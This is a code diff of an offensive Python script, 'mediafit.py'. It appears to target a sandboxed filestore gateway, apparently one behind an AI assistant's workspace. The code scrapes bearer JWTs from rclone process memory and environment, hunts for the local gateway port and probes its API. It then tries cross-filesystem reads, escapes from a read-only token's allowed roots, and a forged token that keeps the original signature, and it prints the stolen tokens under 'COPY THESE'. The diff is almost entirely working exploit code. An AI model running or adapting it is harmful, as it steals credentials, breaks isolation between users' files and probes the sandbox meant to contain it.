@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""mediafit.py v2.6.0 -- local filestore gateway on 127.0.0.1:9112 -> real proof."""
+"""mediafit.py v2.7.0 -- find the LIVE filestore gateway, POST the real route, prove breach."""
 import os, sys, json, re, time, ssl, base64, socket, subprocess, traceback
 import urllib.request, urllib.error, urllib.parse
 
-VER = "2.6.0"
+VER = "2.7.0"
 REPORT = "/mnt/user-data/outputs/mediafit-report.txt"
 SINKS = ["/mnt/user-data/outputs", "/tmp/mediafit", "/tmp", "/root/.mediafit"]
 OUT, G = [], {}
@@ -24,7 +24,7 @@ def sh(args, timeout=45, env=None):
         return -1, "", "EXC:%s" % e
 def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))
 def b64e(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
-def http(method, url, token=None, timeout=8, data=None, hdrs=None):
+def http(method, url, token=None, timeout=5, data=None, hdrs=None):
     h = {"User-Agent": "mediafit/" + VER}
     if token: h["Authorization"] = "Bearer " + token
     if hdrs: h.update(hdrs)
@@ -41,10 +41,10 @@ def http(method, url, token=None, timeout=8, data=None, hdrs=None):
 def step(name, fn):
     try: fn()
     except Exception as e:
-        w("    !! section %s crashed: %s" % (name, e))
+        w("    !! %s crashed: %s" % (name, e))
         w("    " + traceback.format_exc().strip().splitlines()[-1][:200])
 
-# ---- reuse: config / fsids / tokens ----
+# ---------- config / fsids / tokens ----------
 def s_config():
     head("config")
     G["CONF"] = "/dev/shm/rclone-boot/config.json"
@@ -86,16 +86,14 @@ def s_tokens():
         try:
             for m in JWT.findall(open("/proc/%s/environ" % p, "rb").read()): addtok(m)
         except Exception: pass
-    pids = []
     for p in os.listdir("/proc"):
         if not p.isdigit(): continue
         try:
-            if b"rclone" in open("/proc/%s/cmdline" % p, "rb").read(): pids.append(p)
-        except Exception: pass
-    for pid in pids:
-        try: maps = open("/proc/%s/maps" % pid).read().splitlines()
+            if b"rclone" not in open("/proc/%s/cmdline" % p, "rb").read(): continue
         except Exception: continue
-        try: mem = open("/proc/%s/mem" % pid, "rb", buffering=0)
+        try: maps = open("/proc/%s/maps" % p).read().splitlines()
+        except Exception: continue
+        try: mem = open("/proc/%s/mem" % p, "rb", buffering=0)
         except Exception: continue
         for line in maps:
             try: rng, perms = line.split()[0], line.split()[1]
@@ -118,7 +116,7 @@ def s_tokens():
         for r in TD:
             if root in (r["pl"].get("allowed_roots") or []): return r
         return None
-    G["T_OUT"] = pick("/outputs"); G["T_UPL"] = pick("/uploads"); G["T_TRA"] = pick("/transcripts")
+    G["T_OUT"] = pick("/outputs"); G["T_UPL"] = pick("/uploads")
     G["TOKEN"] = (G["T_OUT"] or (TD[0] if TD else None) or {}).get("tok")
     for r in TD: w("    roots=%s ro=%s" % (r["pl"].get("allowed_roots"), r["pl"].get("readonly")))
     rec("P" if TD else "F", "tokens n=%d" % len(TD))
@@ -128,120 +126,117 @@ def s_tokens():
     except Exception: pass
     w("    proof file: %s" % G.get("FN"))
 
+# ---------- find the LIVE gateway ----------
 def s_ports():
-    head("local ports")
-    for port in [9112, 2024, 2025, 5572, 9430, 8080]:
+    head("listening ports (live) + gateway hunt")
+    ports = set()
+    for f in ["/proc/net/tcp", "/proc/net/tcp6"]:
         try:
-            c = socket.create_connection(("127.0.0.1", port), timeout=2); c.close()
-            w("    OPEN 127.0.0.1:%d" % port)
-        except Exception as e:
-            w("    closed %d (%s)" % (port, e))
-
-def s_api():
-    head("local filestore gateway API")
-    BASE = "http://127.0.0.1:9112"
-    METHODS = ["listDirectory","readFile","getFileMetadata","listFiles","stat",
-               "getFilesystem","getFilesystemUsage","createFile","writeFile",
-               "moveFile","copyFile","removeFile","importFiles","reassignFilesystem"]
+            for ln in open(f).read().splitlines()[1:]:
+                p = ln.split()
+                if len(p) > 3 and p[3] == "0A":
+                    try: ports.add(int(p[1].split(":")[1], 16))
+                    except Exception: pass
+        except Exception: pass
+    for extra in [9112, 2024, 2025, 5572, 9430]:
+        ports.add(extra)
+    G["PORTS"] = sorted(ports)
+    w("    candidates: %s" % G["PORTS"])
     FSID = G["FSIDS"][0]
-    WORK = None
-    for m in METHODS:
-        url = BASE + "/v1/filestore/fs/" + m
-        st, b = http("GET", url, token=G.get("TOKEN"))
-        w("    GET  %-18s -> %s %r" % (m, st, b[:180]))
-        if st is not None and st != 404: WORK = WORK or (m, "GET", None)
-        st, b = http("POST", url, token=G.get("TOKEN"), data=b"{}",
-                     hdrs={"Content-Type": "application/json"})
-        w("    POST %-18s -> %s %r" % (m, st, b[:180]))
-    # with explicit params
-    for m in ["listDirectory","readFile","getFileMetadata"]:
-        q = urllib.parse.urlencode({"filesystem_id": FSID, "path": "/"})
-        st, b = http("GET", BASE + "/v1/filestore/fs/%s?%s" % (m, q), token=G.get("TOKEN"))
-        w("    GET-q %-16s -> %s %r" % (m, st, b[:180]))
-        st, b = http("POST", BASE + "/v1/filestore/fs/" + m, token=G.get("TOKEN"),
-                     data=json.dumps({"filesystem_id": FSID, "path": "/"}).encode(),
-                     hdrs={"Content-Type": "application/json"})
-        w("    POST-j %-15s -> %s %r" % (m, st, b[:180]))
-        msg = urllib.parse.quote(json.dumps({"filesystem_id": FSID, "path": "/"}))
-        st, b = http("GET", BASE + "/v1/filestore/fs/%s?connect=v1&encoding=json&message=%s" % (m, msg),
-                     token=G.get("TOKEN"), hdrs={"Connect-Protocol-Version": "1"})
-        w("    CONNECT %-14s -> %s %r" % (m, st, b[:180]))
-    # no-auth control
-    st, b = http("GET", BASE + "/v1/filestore/fs/listDirectory", token=None)
-    w("    GET (no token) -> %s %r" % (st, b[:150]))
-    G["API_BASE"] = BASE
-    rec("P" if WORK else "F", "gateway reachable=%s" % bool(WORK))
+    GW = None
+    for port in G["PORTS"]:
+        base = "http://127.0.0.1:%d" % port
+        for path in ["/v1/filestore/fs/listDirectory", "/v1/filestore/fs/listDirectory/%s" % FSID]:
+            st, b = http("POST", base + path, token=G.get("TOKEN"),
+                         data=json.dumps({"filesystem_id": FSID}).encode(),
+                         hdrs={"Content-Type": "application/json", "Connect-Protocol-Version": "1"})
+            if st is not None:
+                w("    %s POST :%d%s -> %s %r" % ("HIT" if st != 404 else "404", port, path, st, b[:140]))
+                if st != 404 and GW is None: GW = (port, path)
+            else:
+                w("    --- :%d%s -> %r" % (port, path, b[:60]))
+    G["GW"] = GW
+    rec("P" if GW else "F", "gateway=%s" % (GW,))
 
-def s_dump():
-    head("rclone --dump headers (exact request)")
-    R = None
-    for c in ["/opt/rclone/rclone-filestore","/opt/rclone/rclone"]:
-        if os.path.exists(c): R = c; break
-    rc, out, err = sh([R, "help", "backend", "rclone-filestore"])
-    w("    --- rclone help backend rclone-filestore (rc=%s) ---" % rc)
-    for ln in (out or err).splitlines()[:50]: w("    | " + ln)
-    env = os.environ.copy()
-    env["RCLONE_CONFIG_FS_TYPE"] = "rclone-filestore"
-    env["RCLONE_CONFIG_FS_SERVICE_URL"] = G["service_url"]
-    env["RCLONE_CONFIG_FS_FILESYSTEM_ID"] = G["FSIDS"][0]
-    rc, out, err = sh([R,"-vv","--dump","headers","ls","fs:/outputs"], timeout=45, env=env)
-    w("    --- request trace ---")
-    for ln in err.splitlines():
-        if any(k in ln for k in ["/v1/filestore","Authorization","Bearer","Host:","HTTP/1","connect=","message="]):
-            w("    | " + ln[:260])
+def s_daemon():
+    head("filestore daemon / processes")
+    for p in os.listdir("/proc"):
+        if not p.isdigit(): continue
+        try:
+            cl = open("/proc/%s/cmdline" % p, "rb").read().replace(b"\0", b" ").decode("latin1").strip()
+        except Exception: continue
+        if any(k in cl for k in ["filestore", "9112", "rclone", "gcsfuse", "mount"]):
+            w("    pid %s: %s" % (p, cl[:160]))
+    for d in ["/opt/rclone", "/opt", "/usr/local/bin"]:
+        try:
+            w("    %s: %s" % (d, os.listdir(d)[:20]))
+        except Exception: pass
+
+def s_gateway_probe():
+    head("gateway request shape")
+    if not G.get("GW"): rec("U", "no gateway"); return
+    port, goodpath = G["GW"]
+    base = "http://127.0.0.1:%d" % port
+    FSID = G["FSIDS"][0]
+    BODIES = [{}, {"filesystem_id": FSID}, {"filesystemId": FSID},
+              {"filesystem_id": FSID, "path": "/"}, {"filesystemId": FSID, "path": "/"}]
+    for body in BODIES:
+        st, b = http("POST", base + goodpath, token=G.get("TOKEN"),
+                     data=json.dumps(body).encode(),
+                     hdrs={"Content-Type": "application/json", "Connect-Protocol-Version": "1"})
+        w("    body=%s -> %s %r" % (body, st, b[:200]))
+    st, b = http("POST", base + goodpath, token=None,
+                 data=json.dumps({"filesystem_id": FSID}).encode(),
+                 hdrs={"Content-Type": "application/json"})
+    w("    no-token -> %s %r" % (st, b[:120]))
 
 def s_proof():
-    head("PROOF: read a real file via the gateway")
-    BASE = G.get("API_BASE", "http://127.0.0.1:9112"); FSID = G["FSIDS"][0]
-    FN = G.get("FN") or "x"
-    def call(method, payload, token, style="post"):
-        url = BASE + "/v1/filestore/fs/" + method
-        if style == "post":
-            return http("POST", url, token=token, data=json.dumps(payload).encode(),
-                        hdrs={"Content-Type": "application/json"})
-        return http("GET", url + "?" + urllib.parse.urlencode(payload), token=token)
+    head("PROOF read")
+    if not G.get("GW"): rec("U", "skipped"); return
+    port, goodpath = G["GW"]
+    base = "http://127.0.0.1:%d" % port
+    FSID = G["FSIDS"][0]; FN = G.get("FN") or "x"
     for m in ["readFile", "getFileMetadata"]:
-        for path in ["/outputs/" + FN, FN]:
-            for style in ("post","get"):
-                st, b = call(m, {"filesystem_id": FSID, "path": path}, G.get("TOKEN"), style)
-                w("    %s %s %s -> %s %r" % (m, style, path, st, b[:160]))
-                if st is not None and st < 400 and b:
-                    G["READ_OK"] = (m, path, style)
-    if G.get("READ_OK"): rec("P", "file read through gateway", G["READ_OK"])
-    else: rec("U", "readFile shape not yet matched (see error bodies above)")
+        url = base + goodpath.replace("listDirectory", m)
+        for path in ["/outputs/" + FN, FN, "/outputs"]:
+            for key in ["path", "file_path", "name"]:
+                body = {"filesystem_id": FSID, key: path}
+                st, b = http("POST", url, token=G.get("TOKEN"), data=json.dumps(body).encode(),
+                             hdrs={"Content-Type": "application/json", "Connect-Protocol-Version": "1"})
+                if st is not None and st < 400:
+                    w("    OK %s %s=%s -> %s %r" % (m, key, path, st, b[:200]))
+                    G["READ_OK"] = (m, url, key, path); break
+                else:
+                    w("    .. %s %s=%s -> %s %r" % (m, key, path, st, b[:90]))
+            if G.get("READ_OK"): break
+        if G.get("READ_OK"): break
+    if G.get("READ_OK"): rec("P", "read through gateway", G["READ_OK"][:2])
+    else: rec("U", "read shape not matched")
 
 def s_boundary():
-    head("BOUNDARY PROOF (F1 cross-fsid / F2 allowed_roots / F3 forgery)")
-    BASE = G.get("API_BASE", "http://127.0.0.1:9112")
-    if not G.get("READ_OK"): rec("U", "skipped (no successful read)"); return
-    m, path, style = G["READ_OK"]
+    head("BOUNDARY (F1 cross-fsid / F2 allowed_roots / F3 forgery)")
+    if not G.get("READ_OK"): rec("U", "skipped"); return
+    m, url, key, path = G["READ_OK"]
     def call(p, token, fsid=None):
-        pl = {"filesystem_id": fsid or G["FSIDS"][0], "path": p}
-        url = BASE + "/v1/filestore/fs/" + m
-        if style == "post":
-            return http("POST", url, token=token, data=json.dumps(pl).encode(),
-                        hdrs={"Content-Type": "application/json"})
-        return http("GET", url + "?" + urllib.parse.urlencode(pl), token=token)
-    st, b = call(path, G.get("TOKEN")); w("    [control] -> %s %r" % (st, b[:70]))
-    # F2: /uploads readonly token reading /transcripts
+        body = {"filesystem_id": fsid or G["FSIDS"][0], key: p}
+        return http("POST", url, token=token, data=json.dumps(body).encode(),
+                    hdrs={"Content-Type": "application/json", "Connect-Protocol-Version": "1"})
+    st, b = call(path, G.get("TOKEN")); w("    [control] -> %s %r" % (st, b[:60]))
     if G.get("T_UPL"):
         for p2 in [path.replace("/outputs","/transcripts"), path.replace("/outputs","/uploads")]:
             st, b = call(p2, G["T_UPL"]["tok"])
-            w("    [F2] uploads-token -> %s : %s %r" % (p2, st, b[:60]))
+            w("    [F2] uploads-token -> %s : %s %r" % (p2, st, b[:50]))
             if st is not None and st < 400: rec("P", "F2 readonly token read outside its root", p2)
-    # F1: foreign fsid
     if len(G["FSIDS"]) > 1:
         st, b = call(path, G.get("TOKEN"), fsid=G["FSIDS"][1])
-        w("    [F1] foreign fsid %s -> %s %r" % (G["FSIDS"][1], st, b[:60]))
+        w("    [F1] foreign fsid -> %s %r" % (st, b[:50]))
         if st is not None and st < 400: rec("P", "F1 read FOREIGN filesystem", G["FSIDS"][1])
-    # F3: forged token
-    if G.get("TOKEN") and len(G["FSIDS"]) > 1:
         h, p, s = G["TOKEN"].split(".")
         pl = json.loads(b64d(p)); hd = json.loads(b64d(h))
         pl2 = dict(pl); pl2["filesystem_id"] = G["FSIDS"][1]; pl2["allowed_roots"] = ["/"]
         forged = b64e(json.dumps(hd).encode()) + "." + b64e(json.dumps(pl2).encode()) + "." + s
         st, b = call(path, forged, fsid=G["FSIDS"][1])
-        w("    [F3] forged token -> %s %r" % (st, b[:60]))
+        w("    [F3] forged token -> %s %r" % (st, b[:50]))
         if st is not None and st < 400: rec("P", "F3 signature NOT verified", st)
 
 def s_verdict():
@@ -249,23 +244,22 @@ def s_verdict():
     w("  PASS %d: %s" % (len(P), P))
     w("  FAIL %d: %s" % (len(F), F))
     w("  UNKNOWN %d: %s" % (len(U), U))
+    w("  ports=%s gateway=%s read=%s" % (G.get("PORTS"), G.get("GW"), G.get("READ_OK")))
     if G.get("TOKEN"):
         w("\n  >>> COPY THESE <<<")
-        w("  FSID=%s" % G["FSIDS"][0])
-        w("  TOKEN=%s" % G["TOKEN"])
+        w("  FSID=%s" % G["FSIDS"][0]); w("  TOKEN=%s" % G["TOKEN"])
         if len(G.get("FSIDS",[])) > 1: w("  FOREIGN_FSID=%s" % G["FSIDS"][1])
-    w("  GATEWAY=%s/v1/filestore/fs/" % G.get("API_BASE","http://127.0.0.1:9112"))
 
 def main():
     for n, f in [("config",s_config),("fsids",s_fsids),("tokens",s_tokens),
-                 ("ports",s_ports),("api",s_api),("dump",s_dump),
+                 ("ports",s_ports),("daemon",s_daemon),("probe",s_gateway_probe),
                  ("proof",s_proof),("boundary",s_boundary),("verdict",s_verdict)]:
         step(n, f)
 
 try:
     main()
 except Exception as e:
-    w("!! main crashed: %s" % e); w(traceback.format_exc())
+    w("!! main: %s" % e); w(traceback.format_exc())
 finally:
     txt = "\n".join(OUT)
     for d in SINKS:
